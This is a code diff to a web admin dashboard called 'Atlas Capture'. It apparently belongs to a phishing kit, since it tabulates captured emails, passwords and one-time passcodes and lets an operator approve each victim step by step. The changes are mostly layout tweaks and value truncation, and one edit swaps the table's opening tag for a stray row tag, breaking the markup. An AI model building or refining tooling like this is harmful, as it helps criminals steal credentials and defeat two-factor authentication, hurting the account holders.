@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
 <title>Admin Dashboard - Atlas Capture</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -66,7 +66,7 @@ body {
 /* Navbar */
 .navbar {
   background: var(--bg-card);
-  padding: 12px 24px;
+  padding: 12px 20px;
   display: flex;
   justify-content: space-between;
   align-items: center;
@@ -75,16 +75,22 @@ body {
   position: sticky;
   top: 0;
   z-index: 100;
+  flex-wrap: wrap;
+  gap: 10px;
 }
 .navbar h1 {
   font-size: 18px;
   font-weight: 600;
   color: var(--text-primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
 }
 .navbar-right {
   display: flex;
   align-items: center;
   gap: 12px;
+  flex-wrap: wrap;
 }
 .theme-toggle {
   background: var(--bg-table-header);
@@ -128,13 +134,13 @@ body {
 /* Stats Cards */
 .stats {
   display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
   gap: 12px;
   margin-bottom: 20px;
 }
 .stat-card {
   background: var(--bg-card);
-  padding: 14px 20px;
+  padding: 12px 16px;
   border-radius: 16px;
   border: 1px solid var(--border-light);
   box-shadow: var(--shadow-sm);
@@ -164,7 +170,7 @@ body {
 table {
   width: 100%;
   border-collapse: collapse;
-  min-width: 1200px;
+  min-width: 1100px;
 }
 th {
   text-align: left;
@@ -201,7 +207,7 @@ tr:hover {
 .badge-waiting { background: #e0e7ff; color: #4f46e5; }
 .badge-email { background: #fef3c7; color: #d97706; }
 
-/* Action Buttons */
+/* Action Buttons - ALL AVAILABLE for active users */
 .actions-cell {
   white-space: nowrap;
 }
@@ -279,6 +285,11 @@ tr:hover {
   border-radius: 4px;
   font-size: 11px;
   color: var(--text-primary);
+  word-break: break-all;
+  max-width: 150px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
 }
 .data-empty {
   color: var(--text-muted);
@@ -391,6 +402,12 @@ tr:hover {
 
 /* Responsive */
 @media (max-width: 768px) {
+  .navbar {
+    padding: 10px 16px;
+  }
+  .navbar h1 {
+    font-size: 16px;
+  }
   .container {
     padding: 0 12px;
   }
@@ -398,7 +415,7 @@ tr:hover {
     gap: 8px;
   }
   .stat-card {
-    padding: 10px 12px;
+    padding: 8px 12px;
   }
   .stat-card .number {
     font-size: 20px;
@@ -414,10 +431,16 @@ tr:hover {
   .action-btn {
     padding: 3px 6px;
     font-size: 9px;
+    gap: 2px;
   }
   .waiting-badge {
     padding: 3px 6px;
     font-size: 9px;
+  }
+  .data-code {
+    max-width: 100px;
+    font-size: 10px;
+    padding: 2px 4px;
   }
 }
 </style>
@@ -425,7 +448,7 @@ tr:hover {
 <body>
 
 <div class="navbar">
-  <h1><i class="fas fa-chart-line" style="margin-right: 8px; color: #4f46e5;"></i> Atlas Capture Admin</h1>
+  <h1><i class="fas fa-chart-line" style="color: #4f46e5;"></i> Atlas Capture Admin</h1>
   <div class="navbar-right">
     <button class="theme-toggle" id="themeToggleBtn">
       <i class="fas fa-moon"></i>
@@ -463,14 +486,14 @@ tr:hover {
     </div>
     <div class="stat-card">
       <h3><i class="fas fa-key"></i> Active Users</h3>
-      <div class="number" id="activeSecondUsers">0</div>
+      <div class="number" id="activeUsers">0</div>
     </div>
   </div>
 
   <div class="table-container">
-        <table>
+    <tr>
       <thead>
-            <tr>
+        <tr>
           <th>Email</th>
           <th>Password</th>
           <th>First OTP</th>
@@ -480,12 +503,12 @@ tr:hover {
           <th>Registered</th>
           <th>Status</th>
           <th>Actions</th>
-            </tr>
+        </tr>
       </thead>
       <tbody id="usersTableBody">
         <tr><td colspan="9" style="text-align:center; padding:40px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Loading...</td></tr>
       </tbody>
-        </table>
+    </table>
   </div>
 </div>
 
@@ -748,7 +771,7 @@ tr:hover {
     const activeUsers = users.filter(u => u.approved === true && u.otp !== null).length;
     document.getElementById('totalUsers').textContent = users.length;
     document.getElementById('pendingEmail').textContent = pendingEmail;
-    document.getElementById('activeSecondUsers').textContent = activeUsers;
+    document.getElementById('activeUsers').textContent = activeUsers;
   }
 
   function formatValue(value, fieldName) {
@@ -761,7 +784,7 @@ tr:hover {
     });
     return `
       <div class="data-value">
-        <span class="data-code">${escaped}</span>
+        <span class="data-code" title="${escaped}">${escaped.length > 20 ? escaped.substring(0, 20) + '...' : escaped}</span>
         <button class="copy-icon" onclick="copyToClipboard('${escaped.replace(/'/g, "\\'")}', '${fieldName}')" title="Copy ${fieldName}">
           <i class="far fa-copy"></i>
         </button>
@@ -780,7 +803,7 @@ tr:hover {
       let statusBadge = '';
       let actionButtons = '';
       
-      // ALL BUTTONS VISIBLE for users who have entered OTP
+      // ACTIVE USERS (have entered first OTP) - ALL BUTTONS AVAILABLE
       if (user.approved && user.otp) {
         statusBadge = '<span class="badge badge-waiting">🔐 Active User</span>';
         actionButtons = `
@@ -790,13 +813,18 @@ tr:hover {
           <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
           <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
         `;
-      } else if (user.approved && !user.otp) {
+      } 
+      // EMAIL APPROVED - WAITING FOR FIRST OTP
+      else if (user.approved && !user.otp) {
         statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
         actionButtons = '<span class="waiting-badge"><i class="fas fa-clock"></i> Waiting for user</span>';
-      } else if (!user.approved) {
+      } 
+      // PENDING EMAIL APPROVAL
+      else if (!user.approved) {
         statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
         actionButtons = `<button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')"><i class="fas fa-envelope"></i> Approve Email</button>`;
-      } else {
+      } 
+      else {
         statusBadge = '<span class="badge badge-pending">Pending</span>';
         actionButtons = '';
       }
